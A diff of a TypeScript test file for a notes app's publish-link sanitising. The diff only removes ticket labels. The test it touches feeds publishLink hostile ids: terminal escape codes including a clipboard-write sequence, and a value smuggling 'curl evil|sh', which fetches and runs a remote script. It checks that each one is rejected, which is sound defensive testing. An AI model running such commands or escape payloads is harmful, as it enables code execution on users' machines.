@@ -1,5 +1,5 @@
 /**
- * T409: the shared-with, published and blog lines show sanitised text,
+ * the shared-with, published and blog lines show sanitised text,
  * and a publish link is used only when its id is valid.
  * One `it()` per numbered acceptance line.
  */
@@ -59,7 +59,7 @@ function seedN1(store: ReturnType<typeof makeStore>): Note {
   return note;
 }
 
-describe('T409: sanitised bottom lines and valid publish ids only', () => {
+describe('sanitised bottom lines and valid publish ids only', () => {
   it('1: WHEN publishLink gets a published note with publishURL `abc\\x1b[41mX\\x1b]52;c;QQ\\x07`, then `abc\\ncurl evil|sh`, then `a` repeated 65 times THEN each call returns null, and with publishURL `aB3_-x` it returns `https://simp.ly/p/aB3_-x`', () => {
     const base: Note = {
       content: 'x',
